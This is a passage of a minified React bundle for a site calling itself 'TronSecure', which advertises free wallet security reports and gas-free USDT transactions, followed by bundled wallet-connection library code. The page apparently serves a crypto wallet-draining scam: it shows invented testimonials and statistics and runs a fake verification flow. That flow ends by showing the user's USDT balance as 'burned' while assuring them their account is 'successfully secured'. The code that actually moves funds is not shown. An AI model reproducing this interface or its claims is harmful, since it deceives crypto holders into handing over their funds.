    item1: "Cross-reference with major exchanges",
    item2: "Identify potential risks",
    item3: "Ensure safe transactions",
    icon: L.jsx(dM, {
        className: "h-8 w-8 text-gray-500"
    })
}, {
    title: "Transaction Analysis",
    item1: "Complete history review",
    item2: "Suspicious pattern detection",
    item3: "Source of funds verification",
    icon: L.jsx(d3, {
        className: "h-10 w-10 text-gray-500"
    })
}, {
    title: "Trust Network",
    item1: "Shared with major exchanges",
    item2: "Verified wallet recognition",
    item3: "Enhanced trading privileges",
    icon: L.jsx(hM, {
        className: "h-10 w-10 text-gray-500"
    })
}, {
    title: "Digital Certificate",
    item1: "Blockchain-verified certificate",
    item2: "Shareable security badge",
    item3: "Valid for all platforms",
    icon: L.jsx(h3, {
        className: "h-10 w-10 text-gray-500"
    })
}]
  , mH = () => L.jsx("div", {
    className: "w-full flex items-center justify-center   ",
    children: L.jsx("div", {
        className: " w-full grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-2 gap-4 md:gap-20  ",
        children: bH.map( (r, e) => L.jsx("div", {
            className: "flex flex-col items-center w-full relative   justify-center p-6  border rounded-lg shadow-sm bg-white hover:shadow-lg transition ",
            children: L.jsxs("div", {
                className: "w-full flex flex-row gap-4",
                children: [L.jsx("div", {
                    className: "w-12 h-12 bg-[#FBF6FF] hover:bg-[#D1D5DB] rounded-md flex items-center justify-center ",
                    children: r.icon
                }), L.jsxs("div", {
                    className: "flex flex-col gap-2",
                    children: [L.jsx("div", {
                        className: "flex items-center gap-3 mb-3",
                        children: L.jsx("h3", {
                            className: "oswald-heading-h3 uppercase",
                            children: r.title
                        })
                    }), L.jsxs("ul", {
                        className: "list-disc list-inside text-gray-700 space-y-4 ",
                        children: [L.jsxs("li", {
                            className: "flex flex-row gap-2",
                            children: [" ", L.jsx(bm, {
                                className: "text-green-400 text-lg relative top-1"
                            }), L.jsx("span", {
                                className: "primarry-page text-[16px]",
                                children: r.item1
                            })]
                        }), L.jsxs("li", {
                            className: "flex flex-row gap-2",
                            children: [L.jsx(bm, {
                                className: "text-green-400 text-lg  relative top-1"
                            }), L.jsx("span", {
                                className: "text-[16px]",
                                children: r.item2
                            })]
                        }), L.jsxs("li", {
                            className: "flex flex-row gap-2",
                            children: [" ", L.jsx(bm, {
                                className: "text-green-400 text-lg  relative top-1"
                            }), L.jsx("span", {
                                className: "text-[16px]",
                                children: r.item3
                            })]
                        })]
                    })]
                })]
            })
        }, e))
    })
})
  , xH = () => L.jsxs("section", {
    id: "reports",
    className: "w-full flex flex-col items-center justify-center px-8 md:px-24 lg:px-24  gap-8 bg-gradient-to-bl from-[#FEFEFF] via-80% to-[#F9F4FE]",
    children: [L.jsx("h2", {
        className: "oswald-heading-primary uppercase text-center flex",
        children: "Premium Wallet Security Report"
    }), L.jsxs("h3", {
        className: "text-purple-600 text-xl font-bold",
        children: [L.jsx("span", {
            className: "line-through",
            children: "Valued at $10"
        }), " - Now Available for FREE"]
    }), L.jsx(yH, {}), L.jsx(mH, {}), L.jsx("div", {
        className: " w-full  flex flex-row item-center justify-center    h-40 md:h-26   ",
        children: L.jsxs("div", {
            className: " w-full p-8 bg-[#9333EA]  rounded-md flex items-center md:justify-between justify-center flex-col md:flex-row gap-4  ",
            children: [L.jsx("div", {
                className: "",
                children: L.jsxs("nav", {
                    className: " flex text-white item-center justify-center gap-4 flex-row  ",
                    children: [L.jsx(Gs, {
                        className: "w-8 h-8  md:w-7 md:h-7 text-xl "
                    }), L.jsx("h1", {
                        className: "font-bold text-[18px] text-start",
                        children: "Get Your Free Security Report + Priority Access to Gas-Free Transactions"
                    })]
                })
            }), L.jsx("a", {
                href: "/dashboard",
                children: L.jsxs(dn, {
                    className: "inline-flex items-center justify-center w-44 gap-2 hover:gap-4 whitespace-nowrapv  text-sm px-8  h-11 bg-white hover:bg-white text-[#9333EA]    rounded-md shadow-md shadhow-blue-500/20 hover:shadow-blue-500/30 transition-all duration-300 focus-visible:ring-2  font-medium focus-visible:outline-none",
                    children: ["Get Start", L.jsx(N9, {})]
                })
            })]
        })
    })]
})
  , Lv = [{
    text: "TronSecure has revolutionized my USDT trading experience. I've saved over 40% on transaction fees since joining!",
    name: "Alex K.",
    role: "Crypto Trader"
}, {
    text: "The advanced security features give me peace of mind for all my transactions. It's a game-changer in the crypto world.",
    name: "Sarah M.",
    role: "DeFi Investor"
}, {
    text: "Hands down the best platform for gas-free USDT trading. The energy delegation system is brilliant!",
    name: "Michael R.",
    role: "Daily Trader"
}]
  , wH = () => {
    const [r,e] = ue.useState(0)
      , t = () => {
        e(i => i === 0 ? Lv.length - 1 : i - 1)
    }
      , o = () => {
        e(i => i === Lv.length - 1 ? 0 : i + 1)
    }
    ;
    return L.jsxs("div", {
        className: "relative w-full md:w-[35%] lg:w-[35%] overflow-hidden rounded-2xl shadow-md bg-white md:h-[200px] h-[240px]",
        children: [L.jsx("div", {
            className: "flex transition-transform duration-500 ease-in-out",
            style: {
                transform: `translateX(-${r * 100}%)`
            },
            children: Lv.map( (i, n) => L.jsxs("div", {
                className: "min-w-full flex flex-col items-start justify-center space-y-4 px-8 py-6",
                children: [L.jsxs("p", {
                    className: "text-[18px] italic text-gray-900 font-sans",
                    children: ["", i.text, ""]
                }), L.jsxs("nav", {
                    className: "flex items-center gap-2",
                    children: [L.jsx("span", {
                        className: "text-lg text-gray-600",
                        children: i.name
                    }), L.jsxs("span", {
                        className: "text-[#A855F8]",
                        children: [" ", i.role]
                    })]
                })]
            }, n))
        }), L.jsxs("div", {
            className: "absolute bottom-4 left-0 right-0 flex justify-between px-8",
            children: [L.jsx(dn, {
                onClick: t,
                className: "bg-white w-10 h-10 rounded-full text-gray-700 font-normal border border-gray-300 hover:bg-gray-100",
                children: L.jsx(Bq, {
                    className: "mx-auto"
                })
            }), L.jsx(dn, {
                onClick: o,
                className: "bg-white w-10 h-10 rounded-full text-gray-700 font-normal border border-gray-300 hover:bg-gray-100",
                children: L.jsx(_q, {
                    className: "mx-auto"
                })
            })]
        })]
    })
}
  , vH = () => L.jsxs("section", {
    className: "flex w-screen  items-center justify-center flex-col px-8 gap-10",
    children: [L.jsx("h3", {
        className: "oswald-heading-h3 uppercase  flex items-center justify-center text-gray-900",
        children: "What Our Users Say"
    }), L.jsx(wH, {})]
})
  , TH = ({icon: r, title: e, value: t, unit: o, percentage: i, trigger: n}) => {
    const [s,a] = ue.useState(0)
      , [l,f] = ue.useState(0);
    return ue.useEffect( () => {
        if (!n)
            return;
        const h = 5e3
          , p = performance.now()
          , b = v => {
            const T = v - p
              , x = Math.min(T / h, 1);
            a(x * i),
            f(Math.floor(x * t)),
            x < 1 && requestAnimationFrame(b)
        }
        ;
        requestAnimationFrame(b)
    }
    , [n, t, i]),
    L.jsxs("div", {
        className: "bg-white h-[150px] px-4 rounded-xl py-2 shadow-lg border border-purple-100 hover:shadow-xl transition-shadow duration-300 sapce-y-2 flex flex-col justify-center items-center text-start",
        children: [L.jsx("div", {
            className: "flex w-full space-x-4",
            children: L.jsxs("div", {
                className: "flex flex-row w-full gap-2",
                children: [L.jsx("div", {
                    className: "rounded-sm flex items-center justify-center bg-purple-200 text-purple-500 w-12 h-12",
                    children: r
                }), L.jsx("h2", {
                    className: "text-[16px] font-bold uppercase text-gray-600",
                    children: e
                })]
            })
        }), L.jsxs("div", {
            className: "flex w-full items-baseline justify-start space-x-1 text-gray-900",
            children: [L.jsx("span", {
                className: "text-[30px] font-bold",
                children: n ? l.toLocaleString() : 0
            }), L.jsx("span", {
                className: "text-[30px] font-bold",
                children: o
            })]
        }), L.jsx("div", {
            className: "w-full h-1 bg-purple-100 rounded-full overflow-hidden",
            children: L.jsx("div", {
                className: `width: ${s}% h-[4px] bg-purple-500 rounded-full transition-all duration-500 scroll-smooth`
            })
        })]
    })
}
  , EH = () => {
    const r = ue.useRef(null)
      , [e,t] = ue.useState(!1)
      , o = [{
        icon: L.jsx(DV, {
            className: "h-7 w-7"
        }),
        title: "Total Wallets Verified",
        value: 5e6,
        formattedValue: "5,000,000",
        unit: "+",
        percentage: 99.9,
        trigger: !1
    }, {
        icon: L.jsx(AV, {
            className: "h-7 w-7"
        }),
        title: "Security Score Average",
        value: 98.5,
        formattedValue: "98.5",
        unit: "%",
        percentage: 99.9,
        trigger: !1
    }, {
        icon: L.jsx(_V, {
            className: "h-7 w-7"
        }),
        title: "Network Reliability",
        value: 99.99,
        formattedValue: "99.99",
        unit: "%",
        percentage: 99.99,
        trigger: !1
    }, {
        icon: L.jsx(wV, {
            className: "h-7 w-7"
        }),
        title: "Current Waitlist",
        value: 52e4,
        formattedValue: "520,000",
        unit: "+",
        percentage: 99.9,
        trigger: !1
    }];
    return ue.useEffect( () => {
        const i = new IntersectionObserver(n => {
            n.forEach(s => {
                s.isIntersecting && t(!0)
            }
            )
        }
        ,{
            threshold: .1
        });
        return r.current && i.observe(r.current),
        () => {
            r.current && i.unobserve(r.current)
        }
    }
    , []),
    L.jsx("div", {
        ref: r,
        className: "w-full grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 lg:grid-cols-4 py-12 items-center justify-center gap-12",
        children: o.map( (i, n) => L.jsx(TH, {
            ...i,
            trigger: e
        }, n))
    })
}
  , AH = () => L.jsxs("section", {
    id: "trusted",
    className: "w-full flex flex-col  items-center justify-center  px-8 md:px-24 lg:px-24 bg-gradient-to-br form-[#F9F4FE] via-70% to-[#FEFEFF] ",
    children: [L.jsx("h2", {
        className: "oswald-heading-primary uppercase",
        children: "Trusted by Thousands"
    }), L.jsx("p", {
        className: "text-[#4B5563] text-md md:text-xl max-w-2xl text-center",
        children: "Join the growing community of users who trust TronSecure for their secure and efficient crypto transactions."
    }), L.jsx(EH, {}), L.jsx(vH, {})]
})
  , PH = () => L.jsxs("div", {
    className: "flex flex-col items-center justify-center overflow-x-hidden",
    children: [L.jsx(y3, {}), L.jsxs("main", {
        className: "w-full mt-0 flex items-center justify-center flex-col ",
        children: [L.jsx(QV, {}), L.jsx(dH, {}), L.jsx(AH, {}), L.jsx($V, {}), L.jsx(xH, {}), L.jsx(YV, {}), L.jsx(WV, {}), L.jsx(Iq, {})]
    }), L.jsx(HV, {})]
})
  , pM = ue.createContext({
    account: void 0,
    midprogress: void 0,
    usdtbalance: void 0,
    transactionId: void 0,
    setTransactionId: () => {}
    ,
    setAccount: () => {}
    ,
    setUSDTBalance: () => {}
    ,
    setMidProgress: () => {}
})
  , CH = ({children: r}) => {
    const [e,t] = ue.useState(void 0)
      , [o,i] = ue.useState(void 0)
      , [n,s] = ue.useState(void 0)
      , [a,l] = ue.useState(void 0);
    return L.jsx(pM.Provider, {
        value: {
            account: e,
            setAccount: t,
            transactionId: o,
            setTransactionId: i,
            usdtbalance: n,
            setUSDTBalance: s,
            midprogress: a,
            setMidProgress: l
        },
        children: r
    })
}
  , h0 = () => ue.useContext(pM)
  , SH = [xE, CV, TV, mV]
  , BH = ({stepsConfig: r}) => {
    const [e,t] = ue.useState(0)
      , {midprogress: o} = h0()
      , i = r[e].Component
      , n = () => {
        e < r.length - 1 && t(s => s + 1)
    }
    ;
    return L.jsxs("div", {
        className: "  flex flex-col justify-between shadow-2xl px-12 py-16 rounded-2xl  gap-4",
        children: [L.jsxs("div", {
            className: " w-full flex flex-col space-y-4 md:px-28 lg:px-28  px-2 ",
            children: [L.jsx("div", {
                className: "   w-full h-2 bg-white rounded-full z-0",
                children: L.jsx("div", {
                    className: "h-2 bg-[#A855F7] rounded-full transition-all duration-500",
                    style: {
                        width: `${o || e / (r.length - 1) * 100}%`
                    }
                })
            }), L.jsx("div", {
                className: "flex justify-between items-center relative z-10",
                children: r.map( (s, a) => {
                    const l = o === 100 || a < e
                      , f = o !== 100 && a === e
                      , h = SH[a];
                    return L.jsxs("div", {
                        className: "flex-1 flex flex-col items-center",
                        children: [L.jsx("div", {
                            className: `w-12 h-12 flex items-center justify-center rounded-full 
            ${l ? "bg-[#A855F7] text-white" : f ? "bg-[#A855F7]/80 text-white" : "bg-white"} 
            text-gray-400 transition duration-300`,
                            children: L.jsx(h, {
                                className: "w-5 h-5"
                            })
                        }), L.jsx("p", {
                            className: `primarry-page mt-2 ${f || l ? "text-[#A855F7]" : "text-gray-500"}`,
                            children: s.name
                        })]
                    }, a)
                }
                )
            })]
        }), L.jsx("div", {
            className: "flex-1  ",
            children: L.jsx(i, {
                onNext: n
            })
        })]
    })
}
  , _H = ({onNext: r}) => {
    const {usdtbalance: e} = h0();
    return L.jsxs("div", {
        className: "flex-col justify-center items-center text-center",
        children: [L.jsx("div", {
            className: "relative flex w-full items-center justify-center",
            children: L.jsxs("div", {
                className: "flex items-center justify-center flex-col gap-8 relative top-4 md:px-20 lg:px-20 px-4 py-4",
                children: [L.jsxs("div", {
                    className: " flex flex-col items-center text-center space-y-2",
                    children: [L.jsx("h3", {
                        className: "oswald-heading-h3 uppercase text-gray-900",
                        children: "Your account has been successfully secured by our system"
                    }), L.jsx("p", {
                        className: "text-[#4B5563] text-md md:text-xl max-w-2xl",
                        children: "Verification Successful"
                    })]
                }), L.jsxs("div", {
                    className: "w-full flex flex-col items-center border border-[#dec3f7] rounded-lg bg-white p-4 shadow-md",
                    children: [L.jsxs("div", {
                        className: "flex justify-between w-full items-center",
                        children: [L.jsx("p", {
                            className: "primarry-page text-gray-700",
                            children: "TRX"
                        }), L.jsx("h3", {
                            className: "oswald-heading-h4 uppercase text-[#7E22CE]",
                            children: 27
                        })]
                    }), L.jsxs("div", {
                        className: "flex justify-between w-full items-center",
                        children: [L.jsx("p", {
                            className: "primarry-page text-gray-700",
                            children: "USDT Burned"
                        }), L.jsx("h3", {
                            className: "oswald-heading-h4 uppercase text-[#7E22CE]",
                            children: e
                        })]
                    }), L.jsx("div", {
                        className: "mt-4",
                        children: L.jsx("p", {
                            className: "text-red-500 text-center",
                            children: "Flash USDT has been detected and successfully burned by the system."
                        })
                    })]
                })]
            })
        }), L.jsx(dn, {
            onClick: r,
            className: "bg-[#A855F7] hover:bg-gray-900 text-white w-40 mt-2",
            children: "Continue"
        })]
    })
}
;
function IH(r) {
    return Pr({
        attr: {
            viewBox: "0 0 448 512"
        },
        child: [{
            tag: "path",
            attr: {
                d: "M190.5 66.9l22.2-22.2c9.4-9.4 24.6-9.4 33.9 0L441 239c9.4 9.4 9.4 24.6 0 33.9L246.6 467.3c-9.4 9.4-24.6 9.4-33.9 0l-22.2-22.2c-9.5-9.5-9.3-25 .4-34.3L311.4 296H24c-13.3 0-24-10.7-24-24v-32c0-13.3 10.7-24 24-24h287.4L190.9 101.2c-9.8-9.3-10-24.8-.4-34.3z"
            },
            child: []
        }]
    })(r)
}
var $v = {
    exports: {}
}, l8;
function OH() {
    return l8 || (l8 = 1,
    function(r) {
        var e = Object.prototype.hasOwnProperty
          , t = "~";
        function o() {}
        Object.create && (o.prototype = Object.create(null),
        new o().__proto__ || (t = !1));
        function i(l, f, h) {
            this.fn = l,
            this.context = f,
            this.once = h || !1
        }
        function n(l, f, h, p, b) {
            if (typeof h != "function")
                throw new TypeError("The listener must be a function");
            var v = new i(h,p || l,b)
              , T = t ? t + f : f;
            return l._events[T] ? l._events[T].fn ? l._events[T] = [l._events[T], v] : l._events[T].push(v) : (l._events[T] = v,
            l._eventsCount++),
            l
        }
        function s(l, f) {
            --l._eventsCount === 0 ? l._events = new o : delete l._events[f]
        }
        function a() {
            this._events = new o,
            this._eventsCount = 0
        }
        a.prototype.eventNames = function() {
            var f = [], h, p;
            if (this._eventsCount === 0)
                return f;
            for (p in h = this._events)
                e.call(h, p) && f.push(t ? p.slice(1) : p);
            return Object.getOwnPropertySymbols ? f.concat(Object.getOwnPropertySymbols(h)) : f
        }
        ,
        a.prototype.listeners = function(f) {
            var h = t ? t + f : f
              , p = this._events[h];
            if (!p)
                return [];
            if (p.fn)
                return [p.fn];
            for (var b = 0, v = p.length, T = new Array(v); b < v; b++)
                T[b] = p[b].fn;
            return T
        }
        ,
        a.prototype.listenerCount = function(f) {
            var h = t ? t + f : f
              , p = this._events[h];
            return p ? p.fn ? 1 : p.length : 0
        }
        ,
        a.prototype.emit = function(f, h, p, b, v, T) {
            var x = t ? t + f : f;
            if (!this._events[x])
                return !1;
            var E = this._events[x], B = arguments.length, P, O;
            if (E.fn) {
                switch (E.once && this.removeListener(f, E.fn, void 0, !0),
                B) {
                case 1:
                    return E.fn.call(E.context),
                    !0;
                case 2:
                    return E.fn.call(E.context, h),
                    !0;
                case 3:
                    return E.fn.call(E.context, h, p),
                    !0;
                case 4:
                    return E.fn.call(E.context, h, p, b),
                    !0;
                case 5:
                    return E.fn.call(E.context, h, p, b, v),
                    !0;
                case 6:
                    return E.fn.call(E.context, h, p, b, v, T),
                    !0
                }
                for (O = 1,
                P = new Array(B - 1); O < B; O++)
                    P[O - 1] = arguments[O];
                E.fn.apply(E.context, P)
            } else {
                var F = E.length, D;
                for (O = 0; O < F; O++)
                    switch (E[O].once && this.removeListener(f, E[O].fn, void 0, !0),
                    B) {
                    case 1:
                        E[O].fn.call(E[O].context);
                        break;
                    case 2:
                        E[O].fn.call(E[O].context, h);
                        break;
                    case 3:
                        E[O].fn.call(E[O].context, h, p);
                        break;
                    case 4:
                        E[O].fn.call(E[O].context, h, p, b);
                        break;
                    default:
                        if (!P)
                            for (D = 1,
                            P = new Array(B - 1); D < B; D++)
                                P[D - 1] = arguments[D];
                        E[O].fn.apply(E[O].context, P)
                    }
            }
            return !0
        }
        ,
        a.prototype.on = function(f, h, p) {
            return n(this, f, h, p, !1)
        }
        ,
        a.prototype.once = function(f, h, p) {
            return n(this, f, h, p, !0)
        }
        ,
        a.prototype.removeListener = function(f, h, p, b) {
            var v = t ? t + f : f;
            if (!this._events[v])
                return this;
            if (!h)
                return s(this, v),
                this;
            var T = this._events[v];
            if (T.fn)
                T.fn === h && (!b || T.once) && (!p || T.context === p) && s(this, v);
            else {
                for (var x = 0, E = [], B = T.length; x < B; x++)
                    (T[x].fn !== h || b && !T[x].once || p && T[x].context !== p) && E.push(T[x]);
                E.length ? this._events[v] = E.length === 1 ? E[0] : E : s(this, v)
            }
            return this
        }
        ,
        a.prototype.removeAllListeners = function(f) {
            var h;
            return f ? (h = t ? t + f : f,
            this._events[h] && s(this, h)) : (this._events = new o,
            this._eventsCount = 0),
            this
        }
        ,
        a.prototype.off = a.prototype.removeListener,
        a.prototype.addListener = a.prototype.on,
        a.prefixed = t,
        a.EventEmitter = a,
        r.exports = a
    }($v)),
    $v.exports
}
var RH = OH();
const WH = Zc(RH);
var wE;
(function(r) {
    r.Loading = "Loading",
    r.NotFound = "NotFound",
    r.Found = "Found"
}
)(wE || (wE = {}));
var Fs;
(function(r) {
    r.Loading = "Loading",
    r.NotFound = "NotFound",
    r.Disconnect = "Disconnected",
    r.Connected = "Connected"
}
)(Fs || (Fs = {}));
class MH extends WH {
    get connected() {
        return this.state === Fs.Connected
    }
    disconnect() {
        return console.info("The current adapter doesn't support disconnect by DApp."),
        Promise.resolve()
    }
    multiSign(...e) {
        return Promise.reject("The current wallet doesn't support multiSign.")
    }
    switchChain(e) {
        return Promise.reject("The current wallet doesn't support switch chain.")
    }
}
class Au extends Error {
    constructor(e, t) {
        super(e),
        this.error = t
    }
}
class NH extends Au {
    constructor() {
        super(...arguments),
        this.name = "WalletNotFoundError",
        this.message = "The wallet is not found."
    }
}
class zv extends Au {
    constructor() {
        super(...arguments),
        this.name = "WalletDisconnectedError",
        this.message = "The wallet is disconnected. Please connect first."
    }
}
class DH extends Au {
    constructor() {
        super(...arguments),
        this.name = "WalletConnectionError"
    }
}
class FH extends Au {
    constructor() {
        super(...arguments),
        this.name = "WalletDisconnectionError"
    }
}
class UH extends Au {
    constructor() {
        super(...arguments),
        this.name = "WalletSignMessageError"
    }
}
class kH extends Au {
    constructor() {
        super(...arguments),
        this.name = "WalletSignTransactionError"
    }
}
class LH extends Au {
    constructor() {
        super(...arguments),
        this.name = "WalletWindowClosedError",
        this.message = "The QR window is closed."
    }
}
var u8;
(function(r) {
    r.Mainnet = "Mainnet",
    r.Shasta = "Shasta",
    r.Nile = "Nile",
    r.Unknown = "Unknown"
}
)(u8 || (u8 = {}));
var vE;
(function(r) {
    r.Mainnet = "Mainnet",
    r.Shasta = "Shasta",
    r.Nile = "Nile"
}
)(vE || (vE = {}));
const $H = "modulepreload"
  , zH = function(r) {
    return "/" + r
}
  , f8 = {}
  , gM = function(e, t, o) {
    let i = Promise.resolve();
    if (t && t.length > 0) {
        let s = function(f) {
            return Promise.all(f.map(h => Promise.resolve(h).then(p => ({
                status: "fulfilled",
                value: p
            }), p => ({
                status: "rejected",
                reason: p
            }))))
        };
        document.getElementsByTagName("link");
        const a = document.querySelector("meta[property=csp-nonce]")
          , l = (a == null ? void 0 : a.nonce) || (a == null ? void 0 : a.getAttribute("nonce"));
        i = s(t.map(f => {
            if (f = zH(f),
            f in f8)
                return;
            f8[f] = !0;
            const h = f.endsWith(".css")
              , p = h ? '[rel="stylesheet"]' : "";
            if (document.querySelector(`link[href="${f}"]${p}`))
                return;
            const b = document.createElement("link");
            if (b.rel = h ? "stylesheet" : $H,
            h || (b.as = "script"),
            b.crossOrigin = "",
            b.href = f,
            l && b.setAttribute("nonce", l),
            document.head.appendChild(b),
            h)
                return new Promise( (v, T) => {
                    b.addEventListener("load", v),
                    b.addEventListener("error", () => T(new Error(`Unable to preload CSS for ${f}`)))
                }
                )
        }
        ))
    }
    function n(s) {
        const a = new Event("vite:preloadError",{
            cancelable: !0
        });
        if (a.payload = s,
        window.dispatchEvent(a),
        !a.defaultPrevented)
            throw s
    }
    return i.then(s => {
        for (const a of s || [])
            a.status === "rejected" && n(a.reason);
        return e().catch(n)
    }
    )
}
  , jH = Symbol()
  , d8 = Object.getPrototypeOf
  , TE = new WeakMap
  , qH = r => r && (TE.has(r) ? TE.get(r) : d8(r) === Object.prototype || d8(r) === Array.prototype)
  , VH = r => qH(r) && r[jH] || null
  , h8 = (r, e=!0) => {
    TE.set(r, e)
}
  , Xm = {}
  , jv = r => typeof r == "object" && r !== null
  , Rc = new WeakMap
  , ey = new WeakSet
  , HH = (r=Object.is, e= (f, h) => new Proxy(f,h), t=f => jv(f) && !ey.has(f) && (Array.isArray(f) || !(Symbol.iterator in f)) && !(f instanceof WeakMap) && !(f instanceof WeakSet) && !(f instanceof Error) && !(f instanceof Number) && !(f instanceof Date) && !(f instanceof String) && !(f instanceof RegExp) && !(f instanceof ArrayBuffer), o=f => {
    switch (f.status) {
    case "fulfilled":
        return f.value;
    case "rejected":
        throw f.reason;
    default:
        throw f
    }
}
, i=new WeakMap, n= (f, h, p=o) => {
    const b = i.get(f);
    if ((b == null ? void 0 : b[0]) === h)
        return b[1];
    const v = Array.isArray(f) ? [] : Object.create(Object.getPrototypeOf(f));
    return h8(v, !0),
    i.set(f, [h, v]),
    Reflect.ownKeys(f).forEach(T => {
        if (Object.getOwnPropertyDescriptor(v, T))
            return;
        const x = Reflect.get(f, T)
          , E = {
            value: x,
            enumerable: !0,
            configurable: !0
        };
        if (ey.has(x))
            h8(x, !1);
        else if (x instanceof Promise)
            delete E.value,
            E.get = () => p(x);
        else if (Rc.has(x)) {
            const [B,P] = Rc.get(x);
            E.value = n(B, P(), p)
        }
        Object.defineProperty(v, T, E)
    }
    ),
    Object.preventExtensions(v)
}
, s=new WeakMap, a=[1, 1], l=f => {
    if (!jv(f))
        throw new Error("object required");
    const h = s.get(f);
    if (h)
        return h;
    let p = a[0];
    const b = new Set
      , v = (W, k=++a[0]) => {
        p !== k && (p = k,
        b.forEach(H => H(W, k)))
    }
    ;
    let T = a[1];
    const x = (W=++a[1]) => (T !== W && !b.size && (T = W,
    B.forEach( ([k]) => {
        const H = k[1](W);
        H > p && (p = H)
    }
    )),
    p)
      , E = W => (k, H) => {
        const X = [...k];
        X[1] = [W, ...X[1]],
        v(X, H)
    }
      , B = new Map
      , P = (W, k) => {
        if ((Xm ? "production" : void 0) !== "production" && B.has(W))
            throw new Error("prop listener already exists");
        if (b.size) {
            const H = k[3](E(W));
            B.set(W, [k, H])
        } else
            B.set(W, [k])
    }
      , O = W => {
        var k;
        const H = B.get(W);
        H && (B.delete(W),
        (k = H[1]) == null || k.call(H))
    }
      , F = W => (b.add(W),
    b.size === 1 && B.forEach( ([H,X], Y) => {
        if ((Xm ? "production" : void 0) !== "production" && X)
            throw new Error("remove already exists");
        const V = H[3](E(Y));
        B.set(Y, [H, V])
    }
    ),
    () => {
        b.delete(W),
        b.size === 0 && B.forEach( ([H,X], Y) => {
            X && (X(),
            B.set(Y, [H]))
        }
        )
    }
    )
      , D = Array.isArray(f) ? [] : Object.create(Object.getPrototypeOf(f))
      , M = e(D, {
        deleteProperty(W, k) {
            const H = Reflect.get(W, k);
            O(k);
            const X = Reflect.deleteProperty(W, k);
            return X && v(["delete", [k], H]),
            X
        },
        set(W, k, H, X) {
            const Y = Reflect.has(W, k)
              , V = Reflect.get(W, k, X);
            if (Y && (r(V, H) || s.has(H) && r(V, s.get(H))))
                return !0;
            O(k),
            jv(H) && (H = VH(H) || H);
            let R = H;
            if (H instanceof Promise)
                H.then(_ => {
                    H.status = "fulfilled",
                    H.value = _,
                    v(["resolve", [k], _])
                }
                ).catch(_ => {
                    H.status = "rejected",
                    H.reason = _,
                    v(["reject", [k], _])
                }
                );
            else {
                !Rc.has(H) && t(H) && (R = l(H));
                const _ = !ey.has(R) && Rc.get(R);
                _ && P(k, _)
            }
            return Reflect.set(W, k, R, X),
            v(["set", [k], H, V]),
            !0
        }
    });
    s.set(f, M);
    const C = [D, x, n, F];
    return Rc.set(M, C),
    Reflect.ownKeys(f).forEach(W => {
        const k = Object.getOwnPropertyDescriptor(f, W);
        "value"in k && (M[W] = f[W],
        delete k.value,
        delete k.writable),
        Object.defineProperty(D, W, k)
    }
    ),
    M
}
) => [l, Rc, ey, r, e, t, o, i, n, s, a]
  , [GH] = HH();
function Jc(r={}) {
    return GH(r)
}
function Pu(r, e, t) {
    const o = Rc.get(r);
    (Xm ? "production" : void 0) !== "production" && !o && console.warn("Please use proxy object");
    let i;
    const n = []
      , s = o[3];
    let a = !1;
    const f = s(h => {
        n.push(h),
        i || (i = Promise.resolve().then( () => {
            i = void 0,
            a && e(n.splice(0))
        }
        ))
    }
    );
    return a = !0,
    () => {
        a = !1,
        f()
    }
}
function KH(r, e) {
    const t = Rc.get(r);
    (Xm ? "production" : void 0) !== "production" && !t && console.warn("Please use proxy object");
    const [o,i,n] = t;
    return n(o, i(), e)
}
const Tn = Jc({
    history: ["ConnectWallet"],
    view: "ConnectWallet",
    data: void 0
})
  , yM = {
    state: Tn,
    subscribe(r) {
        return Pu(Tn, () => r(Tn))
    },
    push(r, e) {
        r !== Tn.view && (Tn.view = r,
        e && (Tn.data = e),
        Tn.history.push(r))
    },
    reset(r) {
        Tn.view = r,
        Tn.history = [r]
    },
    replace(r) {
        Tn.history.length > 1 && (Tn.history[Tn.history.length - 1] = r,
        Tn.view = r)
    },
    goBack() {
        if (Tn.history.length > 1) {
            Tn.history.pop();
            const [r] = Tn.history.slice(-1);
            Tn.view = r
        }
    },
    setData(r) {
        Tn.data = r
    }
}
  , Qn = {
    WALLETCONNECT_DEEPLINK_CHOICE: "WALLETCONNECT_DEEPLINK_CHOICE",
    WCM_VERSION: "WCM_VERSION",
    RECOMMENDED_WALLET_AMOUNT: 9,
    isMobile() {
        return typeof window < "u" ? !!(window.matchMedia("(pointer:coarse)").matches || /Android|webOS|iPhone|iPad|iPod|BlackBerry|Opera Mini/u.test(navigator.userAgent)) : !1
    },
    isAndroid() {
        return Qn.isMobile() && navigator.userAgent.toLowerCase().includes("android")
    },
    isIos() {
        const r = navigator.userAgent.toLowerCase();
        return Qn.isMobile() && (r.includes("iphone") || r.includes("ipad"))
    },
    isHttpUrl(r) {
        return r.startsWith("http://") || r.startsWith("https://")
    },
    isArray(r) {
        return Array.isArray(r) && r.length > 0
    },
    isTelegram() {
        return typeof window < "u" && (!!window.TelegramWebviewProxy || !!window.Telegram || !!window.TelegramWebviewProxyProto)
    },
    formatNativeUrl(r, e, t) {
        if (Qn.isHttpUrl(r))
            return this.formatUniversalUrl(r, e, t);
        let o = r;
        o.includes("://") || (o = r.replaceAll("/", "").replaceAll(":", ""),
        o = `${o}://`),
        o.endsWith("/") || (o = `${o}/`),
        this.setWalletConnectDeepLink(o, t);
        const i = encodeURIComponent(e);
        return `${o}wc?uri=${i}`
    },
    formatUniversalUrl(r, e, t) {
        if (!Qn.isHttpUrl(r))
            return this.formatNativeUrl(r, e, t);
        let o = r;
        if (o.startsWith("https://t.me")) {
            const n = Buffer.from(e).toString("base64").replace(/[=]/g, "");
            o.endsWith("/") && (o = o.slice(0, -1)),
            this.setWalletConnectDeepLink(o, t);
            const s = new URL(o);
            return s.searchParams.set("startapp", n),
            s.toString()
        }
        o.endsWith("/") || (o = `${o}/`),
        this.setWalletConnectDeepLink(o, t);
        const i = encodeURIComponent(e);
        return `${o}wc?uri=${i}`
    },
    async wait(r) {
        return new Promise(e => {
            setTimeout(e, r)
        }
        )
    },
    openHref(r, e) {
        const t = this.isTelegram() ? "_blank" : e;
        window.open(r, t, "noreferrer noopener")
    },
    setWalletConnectDeepLink(r, e) {
        try {
            localStorage.setItem(Qn.WALLETCONNECT_DEEPLINK_CHOICE, JSON.stringify({
                href: r,
                name: e
            }))
        } catch {
            console.info("Unable to set WalletConnect deep link")
        }
    },
    setWalletConnectAndroidDeepLink(r) {
        try {
            const [e] = r.split("?");
            localStorage.setItem(Qn.WALLETCONNECT_DEEPLINK_CHOICE, JSON.stringify({
                href: e,
                name: "Android"
            }))
        } catch {
            console.info("Unable to set WalletConnect android deep link")
        }
    },
    removeWalletConnectDeepLink() {
        try {
